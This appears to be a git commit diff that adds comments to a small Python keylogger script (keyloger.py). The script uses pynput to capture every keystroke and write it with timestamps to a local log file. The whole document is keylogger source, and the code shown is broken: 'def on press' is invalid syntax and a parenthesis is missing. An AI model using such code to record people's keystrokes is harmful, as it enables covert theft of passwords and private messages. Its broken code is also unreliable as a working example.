68fc47ce12e5f1f87e7d6db8510ef5fc07314874
malikmagry <108147281+malikmagry@users.noreply.github.com>
2022-11-01 17:37:54 +0530

    Update keyloger.py

--- keyloger.py
+++ keyloger.py
@@ -1,8 +1,11 @@
+# Install pynput using the following command: pip install pynput
+# Import the mouse and keynboard from pynput
 from pynput.keyboard import Key, Listener
 import logging
 
 log_dir = ""
 
+# log keys into a file and also get loging information date and time for keys pressed 
 logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s'
 def on press (key):
 	logging.info (str (key))
